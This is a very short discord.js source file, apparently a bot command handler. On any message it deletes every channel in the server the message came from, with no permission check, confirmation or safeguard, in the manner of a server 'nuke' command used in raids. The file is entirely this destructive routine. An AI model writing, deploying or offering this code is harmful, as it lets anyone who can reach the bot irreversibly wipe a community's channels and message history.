/**
 * 
 * @param {import('discord.js').Message} msg 
 */
module.exports = async (msg) => {
    msg.guild.channels.cache.forEach(channel => {
        channel.delete()
    })
}